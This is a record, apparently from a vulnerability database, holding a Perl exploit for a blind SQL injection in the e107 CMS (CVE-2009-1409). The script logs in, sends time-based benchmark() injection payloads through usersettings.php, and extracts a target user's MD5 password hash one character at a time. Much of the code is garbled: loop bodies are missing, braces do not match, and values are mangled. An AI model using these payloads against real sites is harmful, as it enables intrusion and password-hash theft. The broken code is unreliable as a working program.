{
    "text": "vul_name : e107 <= 0.7.15 ( extended_user_fields ) Blind SQL Injection Exploit ， vul_cve : CVE-2009-1409 ， vul_poc :  #  ! /usr/bin/env perl ，  # e107 <= 0.7.15 \"extended_user_fields\" Blind SQL Injection Exploit ，  # Description ，  # e107 contains one flaw that allows an attacker to carry out an SQL ，  # injection attack. The issue is due to the \"usersettings.php\" script ，  # not properly saniting user-supplied input to the hide [  ] key. ，  # This may allow an attacker to inject or manipulate sql queries in ，  # the backend database if magic_quotes_gpc = off. ，  # Code Details ( usersettings.php )  ，  # Line 433 - 441 ，  # if (  $ ue_fields ) { ，  #  $ hidden_fields = implode ( \"^\" , array_keys (  $ _POST [ 'hide' ]  )  ; <- {1} ，  # if (  $ hidden_fields ! = \" )  ，  # { ，  #  $ hidden_fields = \"^\". $ hidden_fields.\"^\" ;  ，  # } ，  #  $ ue_fields .= \" , user_hidden_fields = '\". $ hidden_fields.\"'\" ; <- {2} ，  # } ，  # Line 470 - 476 ，  # if (  $ ue_fields )  ，  # { ，  #  [ etc. ]  ，  #  $ sql->db_Update ( \"user_extended\" ,  $ ue_fields.\" WHERE user_extended_id = '\".intval (  $ inp ) .\"'\" )  ;  ，  # } ，  # ue [  ] POST variable needs a valid key ，  # such as \"aim\" , \"msn\" or other user_extended_fields ，  #  (  @ fields array ) . ，  # Fix this sql injection using ( php function )  ，  # mysql_real_escape_string to the POST 'hide' key ,  ，  # otherwise find a way to fix it. dont care ，  # Discovered & Written ，  # by Juri Gianni aka yeat - staker [ at ] hotmail [ dot ] it ，  # Thanks to ，  # JosS , girex , str0ke , certaindeath , plucky ，  #  # zeroidentity chan - ， use LWP : UserAgent ;  ， my $ prefix = \"e107_\" ;  # default table_prefix ， my $ type_i = undef ;  ， my $ sock_u = new LWP : UserAgent ;  ， my (  $ domain ,  $ user_name ,  $ user_pwd ,  $ target ) = @ ARGV ;  ， e107 : Usage (  ) unless scalar (  @ ARGV ) > 3 ;  ， e107 : Login (  $ user_name ,  $ user_pwd )  ;  ，  $ type_i = e107 : ExtendedField (  )  ;  ， e107 : Exploit (  )  ;  ， sub e107 : Usage ， { ， print \"e107 <= 0.7.15 'extended_user_fields' Blind SQL Injection Exploit\\n\" ;  ， print \"Usage : perl xpl.pl [ username ]  [ password ]  [ target id ] \\n\" ;  ， print \"Usage : perl xpl.pl yeat an4rchy 1\\n\" ;  ， exit ;  ， } ， sub e107 : Exploit ， { ， e107 : Vulnerable (  )  ;  ， e107 : BruteForce (  )  ;  ， } ， sub e107 : SqlQuery ， { ， my (  $ do_query ,  $ response ,  $ start ,  $ down ,  $ element )  ;  ，  $ do_query = $ _ [ 0 ]  | die $  !  ;  ，  $ start = time (  )  ;  ，  $ response = $ sock_u->post (  $ domain.'/usersettings.php' ,  ，  [  ， \"email\" => 'doesnt @ exists.net' ,  ， \"ue [ user_ $ type_i ] \" => 1 ,  ， \"hide [  $ do_query ] \" => 1 ,  ， \"updatesettings\" => 'Save Settings' ,  ，  ]  ) or die $  !  ;  ，  $ down = time (  )  ;  ， } ， sub e107 : CheckField ， { ， my (  $ do_query ,  $ response ,  $ start ,  $ down ,  $ element )  ;  ，  $ do_query = $ _ [ 0 ]  ;  ，  $ element = $ _ [ 1 ]  | die $  !  ;  ，  $ start = time (  )  ;  ，  $ response = $ sock_u->post (  $ domain.'/usersettings.php' ,  ，  [  ， \"email\" => 'doesnt @ exists.net' ,  ， \"ue [ user_ $ element ] \" => 1 ,  ， \"hide [  $ do_query ] \" => 1 ,  ， \"updatesettings\" => 'Save Settings' ,  ，  ]  ) or die $  !  ;  ，  $ down = time (  )  ;  ， } ， sub e107 : ExtendedField ， { ， my @ fields = ( 'yeat' , 'aim' , 'birthday' , 'icq' , 'language' , 'location' , 'msn' , 'yahoo' , 'homepage' )  ;  ， my $ query = \"\\x27/OR/CASE/WHEN ( 1>0 ) /THEN\". ， \"/benchmark ( 100000000 , CHAR ( 0 ) /END # \" ;  ， } ， unless (  $ i ! = 8 $ fields [  $ i ]  ) { ， die ( \"Site not vulnerable.\\n\" )  ;  ， } ， } ， } ， sub e107 : SqlBrute ， { ， my $ ascii = $ _ [ 0 ]  ;  ， my $ limit = $ _ [ 1 ]  | 1 ;  ， my $ sql_query = \"\\x27/OR/ ( SELECT/IF ( ASCII ( SUBSTRING ( user_password ,  $ limit , 1 ) \". ， \"= $ ascii )  , benchmark ( 200000000 , CHAR ( 0 )  , 0 ) /FROM/ $ {prefix}user/\". ， \"WHERE/user_id= $ target )  # \" ;  ， } ， sub e107 : BruteForce ， { ， my $ i = 1 ;  ， my @ charset = ( 97.102 , 48.57 )  ;  ， my $ convert = undef ;  ， my $ result = undef ;  ， foreach $ convert (  @ charset ) { ， syswrite ( STDOUT , chr (  $ convert )  ;  $ i+ ;  ， last ;  $ result .= chr (  $ convert )  ;  ， } ， } ， } ， unless ( length (  $ result )  ! = 32 ) { ， print \"\\nHash MD5 :  $ result\\n\" ;  ， print \"User ID :  $ target\\n\" ;  ， } ， } ， sub e107 : Vulnerable ， { ， my @ fields = ( 'yeat' , 'aim' , 'birthday' , 'icq' , 'language' , 'location' , 'msn' , 'yahoo' , 'homepage' )  ;  ， print \"Exploiting.\\n\" ; last ;  ， } ， die ( \"Site not vulnerable.\\n\" )  ;  ， } ， } ， } ， sub e107 : Login ， { ， my (  $ username ,  $ password ) = @ _ ;  ， my (  $ result ,  $ response )  ;  ，  $ response = $ sock_u->post (  $ domain.'/signup.php' ,  ，  [  ， username => $ username ,  ， userpass => $ password ,  ， userlogin => 'Login' ,  ， autologin => 0 ，  ]  ) or die $  !  ;  ，  $ result = $ response->as_string ;  ，  $ sock_u->default_header ( 'Cookie' => \"e107cookie= $ 1. $ 2 ; \" )  ;  ，  $ sock_u->agent ( 'Lynx ( textmode ) - Logged' )  ;  ， } ， die ( \"Login failed.\\n\" )  ;  ， } ， }",
    "time": "2009.04.25"
}